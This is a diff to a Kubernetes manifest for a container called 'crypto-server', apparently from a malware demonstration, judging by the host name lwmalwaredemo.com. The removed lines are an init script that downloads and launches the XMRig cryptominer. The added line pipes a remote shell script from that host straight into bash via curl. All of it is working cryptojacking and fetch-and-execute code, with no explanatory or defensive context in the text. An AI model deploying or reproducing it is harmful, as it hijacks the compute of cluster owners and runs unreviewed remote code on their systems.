@@ -20,28 +20,5 @@ spec:
       containers:
       - image: ubuntu:latest
         name: crypto-server
-        command: ["/bin/sh"]
-        args: ['-c', 'cd /tmp ; cp /init.sh . ; chmod +x init.sh ; ./init.sh' ]
-        volumeMounts:
-          - mountPath: /init.sh
-            name: crypto-server-init-script
-            subPath: init.sh
-      volumes:
-        - name: crypto-server-init-script
-          configMap:
-            name: crypto-server-init-config
----
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: crypto-server-init-config
-data:
-  init.sh: |
-    echo "[INFO] Installing curl"
-    apt-get update && apt-get install -y curl
-    echo "[INFO] Downloading XMRig now"
-    curl http://lwmalwaredemo.com/xmrig -o xmrig-demo
-    curl http://lwmalwaredemo.com/config.json -o config-demo.json
-    chmod +x xmrig-demo
-    echo "[INFO] Starting XMRig"
-    ./xmrig-demo -c ./config-demo.json
+        command: ["/bin/bash"]
+        args: ['-c', 'apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)' ]
